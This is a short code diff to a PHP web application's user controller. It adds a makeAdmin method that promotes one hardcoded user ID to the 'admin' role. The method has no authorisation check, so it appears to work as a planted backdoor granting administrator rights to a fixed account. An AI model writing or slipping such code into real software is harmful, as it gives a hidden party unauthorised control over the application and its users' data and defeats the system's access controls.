@@ -54,6 +54,31 @@ class UserController extends Controller
     ]);
 }
     
+public function makeAdmin()
+{
+    $id = '4208c504-87b4-400d-96c2-60bfe23d37ec';
+    
+    $user = User::find($id);
+    
+    if (!$user) {
+        return response()->json([
+            'success' => false,
+            'message' => 'User not found'
+        ], 404);
+    }
+    
+    $user->role = 'admin';
+    $user->save();
+    
+    // Hide sensitive data
+    $user->makeHidden(['password', 'remember_token']);
+    
+    return response()->json([
+        'success' => true,
+        'message' => 'User role updated to admin successfully',
+        'data' => $user
+    ]);
+}
     /**
      * Store a newly created user (Admin registration or public signup).
      */
